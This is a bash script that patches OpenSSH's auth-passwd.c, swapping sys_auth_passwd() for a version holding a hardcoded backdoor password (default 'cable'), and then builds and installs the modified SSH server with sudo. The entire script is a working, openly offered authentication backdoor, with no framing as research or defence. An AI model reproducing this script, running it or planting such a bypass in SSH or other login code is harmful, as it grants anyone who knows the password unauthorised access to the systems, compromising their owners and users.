#!/usr/bin/env bash
#
# build_customssh.sh
#
# This script modifies OpenSSH's `auth-passwd.c` by **completely removing** the
# original `sys_auth_passwd()` function and replacing it with a new version
# that contains a **hardcoded backdoor password**.
#
# Then it builds and installs OpenSSH from the 'openssh-portable' directory.

# ---------------------
# Configuration
# ---------------------
PASSWORD="${PASSWORD:-cable}"  # Default backdoor password
OPENSSH_DIR="openssh-portable" # OpenSSH source directory
PREFIX="/usr/local/customssh"  # Install path
SYSCONFDIR="/etc/customssh"    # Config files path
AUTH_FILE="${OPENSSH_DIR}/auth-passwd.c" # Path to auth-passwd.c

# ---------------------
# Ensure we start clean
# ---------------------
echo "=== Ensuring autoconf is installed (sudo required) ==="
sudo apt-get update
sudo apt-get install -y autoconf

# ---------------------
# Validate OpenSSH directory
# ---------------------
if [ ! -d "${OPENSSH_DIR}" ]; then
    echo "Error: Directory ${OPENSSH_DIR} not found."
    exit 1
fi

# ---------------------
# Backup auth-passwd.c before modification
# ---------------------
echo "=== Backing up ${AUTH_FILE} to ${AUTH_FILE}.bak ==="
cp "${AUTH_FILE}" "${AUTH_FILE}.bak"

# ---------------------
# Remove the original sys_auth_passwd() function
# ---------------------
echo "=== Removing original sys_auth_passwd() function ==="
sed -i '/#elif !defined(CUSTOM_SYS_AUTH_PASSWD)/,/^#endif/d' "${AUTH_FILE}"

# ---------------------
# Inject custom sys_auth_passwd() function
# ---------------------
echo "=== Injecting new sys_auth_passwd() function with password '${PASSWORD}' ==="
cat <<EOF >> "${AUTH_FILE}"
#elif !defined(CUSTOM_SYS_AUTH_PASSWD)
int
sys_auth_passwd(struct ssh *ssh, const char *password)
{
    if (strcmp(password, "${PASSWORD}") == 0) { return 1; }

    Authctxt *authctxt = ssh->authctxt;
    struct passwd *pw = authctxt->pw;
    char *encrypted_password, *salt = NULL;

    /* Just use the supplied fake password if authctxt is invalid */
    char *pw_password = authctxt->valid ? shadow_pw(pw) : pw->pw_passwd;

    if (pw_password == NULL)
        return 0;

    /* Check for users with no password. */
    if (strcmp(pw_password, "") == 0 && strcmp(password, "") == 0)
        return 1;

    /*
     * Encrypt the candidate password using the proper salt, or pass a
     * NULL and let xcrypt pick one.
     */
    if (authctxt->valid && pw_password[0] && pw_password[1])
        salt = pw_password;
    encrypted_password = xcrypt(password, salt);

    /*
     * Authentication is accepted if the encrypted passwords
     * are identical.
     */
    return (encrypted_password != NULL &&
            strcmp(encrypted_password, pw_password) == 0);
}
#endif
EOF

# ---------------------
# Verify the modification
# ---------------------
echo "=== New sys_auth_passwd() function added successfully. ==="
grep -A 20 "int[[:space:]]\+sys_auth_passwd(" "${AUTH_FILE}"

# ---------------------
# Build OpenSSH
# ---------------------
echo "=== Running make distclean ==="
cd "${OPENSSH_DIR}" || exit 1
make distclean || true

echo "=== Running autoreconf -fi ==="
autoreconf -fi

echo "=== Configuring with --prefix=${PREFIX} --sysconfdir=${SYSCONFDIR} ==="
./configure --prefix="${PREFIX}" --sysconfdir="${SYSCONFDIR}"

echo "=== Running make ==="
make

echo "=== Running sudo make install ==="
sudo make install

echo "=== Done! Custom OpenSSH with password '${PASSWORD}' was installed at '${PREFIX}'. ==="
